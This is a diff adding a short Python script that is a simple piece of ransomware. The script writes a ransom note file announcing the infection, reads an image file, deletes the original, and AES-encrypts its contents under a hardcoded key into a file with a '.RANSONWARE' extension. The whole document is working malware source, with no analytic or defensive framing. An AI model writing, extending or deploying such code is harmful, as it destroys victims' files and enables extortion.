@@ -1,0 +1,23 @@
+import os
+import pyaes
+
+text_name = "READTHIS.txt"
+text = open(text_name, "wb")
+text_data = text.write("You got infected by RANSON ")
+text.close()
+
+file_name = "1.png"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+os.remove(file_name)
+
+chave = "0a5e9d3r1a5v2e9h"
+aes = pyaes.AESModeOfOperationCTR(chave)
+encripta_dados = aes.encrypt(file_data)
+
+new_file_name = file_name + ".RANSONWARE"
+new_file = open(new_file_name, "wb")
+new_file_data = new_file.write(encripta_dados)
+new_file.close()
